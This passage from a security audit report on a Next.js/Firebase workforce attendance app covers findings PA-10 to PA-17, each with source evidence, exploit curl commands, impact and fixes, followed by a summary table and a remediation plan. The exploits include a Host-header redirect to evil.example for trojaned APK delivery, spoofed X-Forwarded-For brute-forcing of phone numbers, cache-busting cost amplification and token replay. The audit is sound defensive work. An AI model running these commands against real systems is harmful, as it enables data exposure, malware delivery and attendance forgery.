    qrCodeUrl: data.qrCodeUrl ?? "",
    joiningDate: data.joiningDate ?? null,
  });
}
```

```ts
// src/app/api/employees/public-profile/[id]/route.ts:75-84   <-- unconditional fallback
return NextResponse.json({
  id: docSnap.id,
  fullName: data.fullName ?? "",
  employeeId: data.employeeId ?? "",
  clientName: data.clientName ?? "",
  profilePictureUrl: data.profilePictureUrl ?? "",
  status: data.status ?? "",
  qrCodeUrl: data.qrCodeUrl ?? "",
  joiningDate: data.joiningDate ?? null,
});
```

The `publicProfile` existence and `status === "Active"` gate is decorative: when the employee has no `publicProfile` **or** is not Active, the fallback returns the same fields directly from the root document. There is no authentication, no ownership check and no rate limit. IDOR is by Firestore document id — which is a 20-char auto-id (`employees/enroll/route.ts:308` uses `.doc()`), so it is not directly enumerable; it *is*, however, handed to anonymous callers by PA-03. The `demo` branch at `:12-48` is a hardcoded fixture, not a leak.

### Exploit

```bash
# EMPLOYEE_DOC_ID obtained for free from PA-03
curl -sS "https://HOST/api/employees/public-profile/EMPLOYEE_DOC_ID"
```

Expected: `{"id":"EMPLOYEE_DOC_ID","fullName":"…","employeeId":"CISS/TCS/2025-26/871","clientName":"…","profilePictureUrl":"…","status":"Inactive","qrCodeUrl":"data:image/png;base64,… or https://…","joiningDate":"…"}`

### Impact

Identity + employer + joining date + status for any employee, including inactive ones, anonymously. `qrCodeUrl` is populated at enrollment with `generateQrCodeDataUrl(...)` (`employees/enroll/route.ts:302,325`) — if it is a data-URL or an unauthenticated Storage URL it is the guard's **attendance QR badge**, i.e. the credential consumed by PA-01. That specific escalation needs a live check of one real record's `qrCodeUrl`.

### Fix

- Require authentication and enforce that the caller either owns the record or holds an admin/field-officer claim.
- Delete the fallback branch: if there is no `publicProfile`, or it is not `Active`, return 404.
- Never place `qrCodeUrl` — the attendance credential — in any publicly reachable payload; if a public "verify this ID" page is needed, return name + photo only.

---

## PA-11 — Medium — Host-header-driven open redirect (APK download) and origin reflection

**Severity:** Medium
**Status:** Code defect Confirmed (source); live behaviour needs-live-verification (whether Vercel/Next normalises `request.url` to the deployment host)
**Location:** `src/app/api/public/download/android/route.ts:12-18`, `src/lib/android-release.ts:70-75`, `src/app/api/public/app-update/route.ts:15`

### Evidence

```ts
// src/lib/android-release.ts:70-75
export function resolveAndroidApkUrl(release: AndroidRelease, requestOrigin: string): string {
  return new URL(release.apkUrl || release.apkPath, requestOrigin).toString();
}
```

```ts
// src/app/api/public/download/android/route.ts:11-18
const release = await getAndroidRelease();
const target = resolveAndroidApkUrl(release, new URL(request.url).origin);
return NextResponse.redirect(target, { headers: { "Cache-Control": "no-store, max-age=0" } });
```

`request.url`'s origin is derived from the request's `Host` header, and the shipped manifest uses a **root-relative** path:

```json
// public/downloads/ciss-workforce-android.json
"apkPath": "/downloads/ciss-workforce-1.0.21.apk",
```

so `new URL("/downloads/...apk", "http://attacker.example")` resolves to the attacker's host.

### Exploit

```bash
# 302 towards an attacker-controlled host serving a trojaned APK
curl -sSI "https://HOST/api/public/download/android" -H "Host: evil.example"
# -> HTTP/2 307  location: http://evil.example/downloads/ciss-workforce-1.0.21.apk

# same origin reflection in the JSON manifest
curl -sS "https://HOST/api/public/app-update" -H "Host: evil.example"
# -> {"apkUrl":"http://evil.example/downloads/ciss-workforce-1.0.21.apk", ...}
```

Expected if exploitable: `location` points at `evil.example`. If Vercel/Next rewrites the origin to the canonical deployment host, the responses will instead contain `https://cisskerala.site/...` — this is the live check to run.

### Impact

A trustworthy-looking `cisskerala.site` link hands the user a redirect into an attacker host. For a workforce app whose guards are told to sideload APKs, redirecting an APK download to a hostile origin is a high-quality malware-delivery primitive (the genuine manifest also publishes `sha256`/`sizeBytes`, which the attacker simply omits).

### Fix

- Build URLs from a configured base (`process.env.NEXT_PUBLIC_APP_URL`, already used at `android-release.ts:8`) rather than from `request.url`/`Host`. `new URL(apkPath, ANDROID_DOWNLOAD_PAGE_URL)`.
- Pin `apkUrl` in the manifest to an absolute HTTPS URL so a relative path can never re-base.
- Reject requests whose `Host` is not in an allow-list at the edge.

---

## PA-12 — Medium — Client roster + guard counts exposed anonymously, with per-request Firestore count aggregations and no rate limit

**Severity:** Medium
**Status:** Confirmed (source)
**Location:** `src/app/api/public/clients/route.ts:21-58`

### Evidence

```ts
// src/app/api/public/clients/route.ts:23-42
const clientSnapshot = await db.collection("clients").orderBy("name", "asc").get();
const clients = dedupeClientOptions(
  clientSnapshot.docs.filter((doc) => isClientEnrollmentEnabled(doc.data()))
    .map((doc) => mapClient(doc.id, doc.data() as Record<string, unknown>)),
);
const counts = await Promise.all(
  clients.map(async (client) => {
    const snapshot = await db
      .collection("employees")
      .where("status", "==", "Active")
      .where("clientName", "==", client.name)
      .count()
      .get();
    return [client.name, snapshot.data().count] as const;
  }),
);
```

No rate limit, and the response is only nominally cached (`Cache-Control: public, s-maxage=300` at `:54-56`) — an attacker appending a cache-busting query string can force the full set of aggregations on every request.

### Exploit

```bash
# one request -> N Firestore aggregation queries, cache defeated by the query string
for i in $(seq 1 200); do
  curl -sS -o /dev/null "https://HOST/api/public/clients?cb=$i"
done
```

Expected: `{"clients":[{"id":"…","name":"TCS","enrollmentProfile":"tcs"}, …]}` on each call, each triggering one `.count()` per client.

### Impact

Discloses the client portfolio (company-confidential) and, via the ordering, the relative size of each client's active guard workforce. Operationally it is a cheap Firestore-read amplifier: O(#clients) billable aggregations per uncached request, at 200+ requests per loop iteration and no rate limit.

### Fix

- Require authentication, or reduce the public payload to a name list without counts (the counts are not needed by a public enrollment form).
- Rate limit on an unspoofable identity (PA-05) and set `Vary`/`Cache-Control` so query-string noise cannot force revalidation.

---

## PA-13 — Medium — Per-region Firebase configuration disclosed for every `live`/`ready` region

**Severity:** Medium
**Status:** Confirmed (source)
**Location:** `src/app/api/public/region-config/[code]/route.ts:38-78`; related `src/app/api/public/regions/route.ts:16-37`

### Evidence

```ts
// src/app/api/public/region-config/[code]/route.ts:58-77
return NextResponse.json({
  regionCode: region.regionCode,
  regionName: region.regionName,
  apiUrl: region.vercelProductionUrl || `https://ciss-${regionCode.toLowerCase()}.vercel.app`,
  android: { apiKey: region.androidApiKey || region.firebaseApiKey || region.webApiKey || "", … },
  web: { apiKey: region.firebaseApiKey || region.webApiKey || "", appId: …, projectId: …,
         storageBucket: …, authDomain: …, measurementId: … },
});
```

The `KL` branch (`:14-35`) returns the same shape from `NEXT_PUBLIC_*` variables. `regions` additionally publishes other deployments' production URLs:

```ts
// src/app/api/public/regions/route.ts:24-28
return { code, name: String(data.regionName || code),
         apiUrl: data.vercelProductionUrl || `https://ciss-${code.toLowerCase()}.vercel.app` };
```

### Exploit

```bash
curl -sS "https://HOST/api/public/region-config/KL"
curl -sS "https://HOST/api/public/regions"
for CODE in KL TAMILNADU KA; do curl -sS "https://HOST/api/public/region-config/$CODE"; done
```

Expected: `{"regionCode":"KL",…,"web":{"apiKey":"AIza…","appId":"1:…:web:…","projectId":"ciss-workforce","storageBucket":"ciss-workforce.firebasestorage.app",…}}`

### Impact

Firebase `apiKey`/`appId`/`projectId` are public-by-design identifiers, so a bare leak is Low on its own. It is raised here to Medium because of two concrete consequences in this codebase: (1) it hands the attacker the *same* value that `GET /api/public/region-config/KL` and the QR secret share (PA-02), completing that exploit without ever loading the JS bundle; and (2) the `region.webApiKey`/`region.androidApiKey` fallbacks (`:63`, `:70`) suggest per-region keys that may not be public-by-design.

### Fix

- Keep the `NEXT_PUBLIC_*` Firebase config in the client bundle (unavoidable) but stop serving *other* regions' `webApiKey`/`androidApiKey`/`storageBucket` unauthenticated; a region only needs its own config.
- Stop using any value exposed by this endpoint as an HMAC secret (PA-02).
- Ensure Firestore/Storage rules treat these identifiers as public and never as authentication (cross-check with `rules-auditor`).

---

## PA-14 — Low/Medium — Phone-number-to-employee oracle (`employees/lookup`)

**Severity:** Low/Medium
**Status:** Confirmed (source)
**Location:** `src/app/api/employees/lookup/route.ts:14-63`

### Evidence

```ts
// src/app/api/employees/lookup/route.ts:53-63
const snapshot = await adminDb
  .collection("employees")
  .where("phoneNumber", "==", phone)
  .limit(1)
  .get();
if (snapshot.empty) { return NextResponse.json({ found: false }); }
return NextResponse.json({ found: true });
```

Rate limits are 5/min per IP and 3/min per phone (`:18-49`), both keyed on spoofable IP (PA-05) and on a per-phone bucket that does not stop a *different* phone each time.

### Exploit

```bash
# brute-force which phone numbers belong to CISS guards — 5 per spoofed IP per minute
for n in $(seq -w 0000000000 0000000050); do
  curl -sS -X POST "https://HOST/api/employees/lookup" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 203.0.113.$((RANDOM%255))" \
    -d "{\"phoneNumber\":\"9$n\"}"
done
```

Expected: `{"found":true}` for numbers on file, `{"found":false}` otherwise.

### Impact

Confirms whether an arbitrary mobile number is a CISS guard — useful for targeted phishing/social engineering of a specific individual, and it converts PA-03's leaked phones into a cross-checkable roster signal. The response itself is a single boolean, so exposure is limited to membership.

### Fix

- Put this behind the guard login flow, or require an OTP to be sent before answering.
- Add a global (not per-phone) throttle on distinct-number probing, keyed on unspoofable identity; consider a CAPTCHA.

---

## PA-15 — Low — `health` discloses internal Firestore/Admin SDK error strings

**Severity:** Low
**Status:** Confirmed (source)
**Location:** `src/app/api/health/route.ts:10-40`

### Evidence

```ts
// src/app/api/health/route.ts:34-39
} catch (error) {
  const message = error instanceof Error ? error.message : String(error);
  return NextResponse.json({ status: "unhealthy", checks, error: message }, { status: 500 });
}
```

and the per-check variant at `:22-23` embeds the thrown message in `checks.firestoreRead`. Both branches name `systemConfig/_health`, an internal collection/document path.

### Exploit

```bash
curl -sS "https://HOST/api/health"
# trigger the error branch, e.g. by exhausting Firestore or hitting the endpoint's failure mode
```

Expected on failure: `{"status":"unhealthy","checks":{},"error":"… 5 NOT_FOUND: Project 'ciss-workforce' … , or 'PERMISSION_DENIED' …"}` — the raw message is environment-specific (needs-live-verification) but the code path is unconditional.

### Impact

Unbounded error-message disclosure to anonymous callers: project id, IAM/service-account hints, quota status. Minor reconnaissance aid for the PA-13/PA-02 chain; the endpoint is otherwise argument-free so it cannot be used for targeted probing.

### Fix

- Return `{"status":"unhealthy"}` and log the detail server-side. If a detailed probe is required, protect it with `CRON_SECRET`/admin auth.

---

## PA-16 — Low — Identity and upload tokens are replayable (no nonce consumption / single-use enforcement)

**Severity:** Low
**Status:** Confirmed (source)
**Location:** `src/lib/server/attendance-verification-token.ts:42-59` (mint), `:82-94` (verify); `src/lib/server/upload-token.ts:66-76`

### Evidence

The verification token carries a `nonce` but nothing ever records or consumes it:

```ts
// src/lib/server/attendance-verification-token.ts:47-54
const payload: AttendanceVerificationTokenPayload = {
  employeeDocId: input.employeeDocId,
  method: input.method,
  nonce: crypto.randomUUID(),
  iat: now,
  exp: now + (input.ttlSeconds ?? 600),
};
```

```ts
// src/lib/server/attendance-verification-token.ts:82-94
if (
  typeof payload.employeeDocId !== "string" || !payload.employeeDocId ||
  !["qr", "phone", "resourceId", "employeeId"].includes(String(payload.method)) ||
  typeof payload.nonce !== "string" || !payload.nonce ||
  typeof payload.iat !== "number" || typeof payload.exp !== "number" ||
  payload.exp < now || payload.iat > now + 60
) { return null; }
return payload as AttendanceVerificationTokenPayload;
```

The upload token is likewise stateless (`upload-token.ts:66-76` only checks shape and `exp`), so a successful `upload-token` response can be replayed for 300 s and a successful verification token for 600 s, each time re-uploading to the same path (`upload/route.ts:76-81` derives the expected path from the token payload, so replay overwrites the same object).

What is done correctly and should be preserved: HMAC-SHA256 over the payload, `crypto.timingSafeEqual` with an explicit length check (`attendance-verification-token.ts:68-75`), `exp`/`iat` skew window, and binding of the token to `employeeDocId` (`upload-token/route.ts:60-63`, `submit/route.ts:329-332`). The upload token is also correctly bound to `employeeDocId` **and** `attemptId` via the path check.

### Exploit

```bash
# replay the same identification token repeatedly (within 600 s) against submit/upload-token
for i in 1 2 3 4 5; do
  curl -sS -X POST "https://HOST/api/public/attendance/upload-token" \
    -H "Content-Type: application/json" \
    -d '{"employeeDocId":"EMPLOYEE_DOC_ID","siteId":"SITE_ID",
         "attemptId":"3f1c9c1e-6a4e-4c2f-9d3e-2b7c1a5e8f01",
         "attendanceVerificationToken":"<same token>"}' | head -c 200; echo
done
```

Expected: five `uploadToken` values (a fresh nonce-less 300 s token each time) rather than a single-use error.

### Impact

Amplifies PA-01: one harvested token yields an unlimited number of forged submissions and uploads inside its TTL, and there is no server-side record that an identity proof was already spent. This also weakens any future forensic story ("nobody re-identified").

### Fix

- Persist `nonce` (or a `jti`) in a short-TTL Firestore collection at mint time and mark it consumed atomically inside the submit/upload-token transaction; reject a second use.
- Reduce TTLs to the minimum the UI needs and bind the payload additionally to `guardAuthUid` when present.

---

## PA-17 — Low (adjacent, outside the listed routes) — `CRON_SECRET` compared with `===` and accepted in the query string

**Severity:** Low
**Status:** Confirmed (source)
**Location:** `src/app/api/internal/enrollment-draft-cleanup/route.ts:9-22`

### Evidence

```ts
// src/app/api/internal/enrollment-draft-cleanup/route.ts:14-19
const querySecret = new URL(request.url).searchParams.get("key") || "";
const expectedSecret = process.env.CRON_SECRET || "";
return Boolean(
  expectedSecret &&
    (bearerSecret === expectedSecret || querySecret === expectedSecret),
);
```

### Exploit

```bash
# secrets in query strings land in access logs, proxies and caches
curl -sS -X POST "https://HOST/api/internal/enrollment-draft-cleanup?key=CRON_SECRET"
```

Expected: a successful cleanup run for the correct secret (timing-observable string comparison); the route correctly refuses when `CRON_SECRET` is unset (`expectedSecret &&` — no fail-open).

### Impact

Non-constant-time comparison of a shared secret, transmitted in a URL (logged and cacheable). Relevance to this audit: it makes the enrollment egress path (PA-08/PA-09) a triggerable, non-idempotent job for anyone who obtains the secret from a log or a referrer.

### Fix

- Accept the secret only in the `Authorization: Bearer` header, and compare with `crypto.timingSafeEqual` over equal-length buffers.

---

## Checked and found sound (no finding)

These were examined specifically because the task asked, and they hold up:

1. **`mobile/token` and `mobile/session`** — both call `verifyRequestAuth(request)` first (`mobile/token/route.ts:10`, `mobile/session/route.ts:9`) and route that identity into the write/lookup; `mobile/token` even returns 401 on any failure. No IDOR.
2. **`geocode-site` and `locations/geocode`** — both `await requireAdmin(req)` before parsing the body (`geocode-site/route.ts:9`, `locations/geocode/route.ts:9`). No anonymous SSRF. The downstream fetch is pinned to a constant host (`src/lib/server/location-geocode.ts:116`, `new URL("https://api.opencagedata.com/geocode/v1/json")`) with only query parameters influenced by input — **no SSRF**.
3. **`attendance/validate`** — requires a verified ID token and, unless the caller is admin/field-officer, rejects any `employeeDocId` other than the caller's own `employeeDocId`/`employeeId` (`attendance/validate/route.ts:33`, `:50-66`). No IDOR.
4. **`enroll/upload` path handling and IDOR** — the `path` must match `^enrollments/[A-Za-z0-9_-]+/(folder)/[A-Za-z0-9._-]+$`, the second segment must be an existing `enrollments` document, the document must be `status:"draft"` and unexpired, and the token must match the stored SHA-256 with `crypto.timingSafeEqual` (`upload/route.ts:49-83`, `enrollment-draft.ts:14-22`). Cross-draft writes are not possible; the draft token is 32 random bytes.
5. **`enroll/draft` token generation** — `crypto.randomBytes(32)` and a 2-hour TTL (`enrollment-draft.ts:3-8`); only the hash is persisted.
6. **No open redirect other than PA-11** — `/api/public/portal-context` returns `client.portalUrl` from `buildClientPortalUrl`, which rebuilds the URL as `https://<slug>.<ROOT_DOMAIN>` from a slugified value (`src/lib/client-portal.ts:112-116`); the attacker-supplied `Host` cannot escape the configured root domain there. It does, however, let anyone enumerate which client subdomains exist and confirm `portalEnabled` (client name only — informational, folded into PA-12's class rather than given its own ID).
7. **`enrollment-config`** — returns only the enrollment form's field catalogue (labels, enabled/required flags), which is already rendered in the public form. Low.
8. **`public/app-update` GET body** — reads a static manifest from disk (`android-release.ts:59-67`), validated by a Zod schema with a `superRefine` that requires `apkPath` to be an absolute HTTPS URL or root-relative; no path traversal or SSRF. Its only issue is the origin reflection in PA-11.

---

## Summary table

| ID | Severity | One-line | Location |
|---|---|---|---|
| PA-01 | Critical | Unauthenticated attendance forgery for any employee ID via `identify` → `submit` | `public/attendance/identify/route.ts:126-135`, `attendance/submit/route.ts:321-341` |
| PA-02 | High (→Critical live) | QR HMAC secret falls back to public `NEXT_PUBLIC_FIREBASE_API_KEY` / hardcoded default; `CISS_QR_SECRET` unset everywhere | `lib/qr/qr-token.ts:6-9` |
| PA-03 | High | `attendance/employee`: anonymous PII (phone, name, duty state) + Firestore doc id, no rate limit, 999-entry ID space | `public/attendance/employee/route.ts:7-143`, `lib/attendance/public-attendance.ts:134-137` |
| PA-04 | High | QR verification skipped entirely when the QR has no `Token:` field | `public/attendance/identify/route.ts:221-230` |
| PA-05 | High | Rate limits keyed on spoofable left-most `X-Forwarded-For` + unbounded `rateLimits` writes | `lib/server/rate-limit.ts:108-124` |
| PA-06 | High | Anonymous dump of all sites, clients, GPS coordinates, duty points, shifts | `public/attendance/route.ts:31-52` |
| PA-07 | Medium | `verify-qr` leaks guard identity + live attendance state anonymously | `public/attendance/verify-qr/route.ts:120-157` |
| PA-08 | Medium | Anonymous unbounded enrollment-draft creation for arbitrary phone numbers | `public/enroll/draft/route.ts:16-57` |
| PA-09 | Medium | Enrollment upload unthrottled; client-controlled `contentType`; public download tokens | `public/enroll/upload/route.ts:38-123` |
| PA-10 | Medium | `public-profile/[id]` IDOR; fallback ignores `publicProfile`/`status`; leaks `qrCodeUrl` | `employees/public-profile/[id]/route.ts:50-84` |
| PA-11 | Medium | Host-header open redirect on APK download / `apkUrl` reflection | `public/download/android/route.ts:12-18`, `lib/android-release.ts:70-75` |
| PA-12 | Medium | Anonymous client roster + guard counts; O(#clients) aggregations per cache-busted request | `public/clients/route.ts:21-58` |
| PA-13 | Medium | Per-region Firebase config (`apiKey`-class) served unauthenticated for all live regions | `public/region-config/[code]/route.ts:38-78` |
| PA-14 | Low/Med | Phone → employee membership oracle | `employees/lookup/route.ts:53-63` |
| PA-15 | Low | `health` returns raw Firestore/Admin SDK error strings | `health/route.ts:34-39` |
| PA-16 | Low | Identity/upload tokens replayable within TTL (nonce never consumed) | `lib/server/attendance-verification-token.ts:42-94`, `lib/server/upload-token.ts:66-76` |
| PA-17 | Low | `CRON_SECRET` compared with `===`, accepted in query string (adjacent route) | `internal/enrollment-draft-cleanup/route.ts:9-22` |

## Items flagged `needs-live-verification`

1. **PA-02** — whether `CISS_QR_SECRET` is set in Vercel Production. Confirm by forging a token from `region-config/KL`'s `web.apiKey` and checking `verify-qr` for `verified:true`.
2. **PA-05** — whether the platform hands `X-Forwarded-For` through with a client-controlled left-most entry. Confirm with 60 spoofed-IP requests vs. 60 fixed-IP requests and compare `429` counts.
3. **PA-11** — whether `request.url`'s origin follows a spoofed `Host`. Confirm with `curl -sSI .../download/android -H "Host: evil.example"`.
4. **PA-10** — the content of a real `qrCodeUrl` (data URL vs. unauthenticated Storage URL) and whether it decodes to a usable attendance QR.
5. **PA-13** — whether `region.webApiKey`/`androidApiKey` for non-KL regions are public-by-design keys or real secrets.
6. **PA-15** — the exact error string returned by the failure branch in production.

## Recommended remediation order

1. **PA-01 + PA-04** — require a real factor for `identify`; reject tokenless QRs. This closes the forgery chain.
2. **PA-02** — make `CISS_QR_SECRET` mandatory and server-only; set and rotate it in Vercel.
3. **PA-05** — replace `getClientIp` with an unspoofable identity and add `rateLimits` TTL/cleanup; every other rate limit depends on this.
4. **PA-03 + PA-07 + PA-10** — strip PII, internal doc ids and `qrCodeUrl` from every anonymous payload; delete the `public-profile` fallback.
5. **PA-06** — stop serving the whole site/client/GPS collection anonymously.
6. **PA-08 + PA-09 + PA-12** — throttle and CAPTCHA the public write/cost surfaces; whitelist stored content types.
7. **PA-11 + PA-13 + PA-14 + PA-15 + PA-16 + PA-17** — configuration and hardening pass.
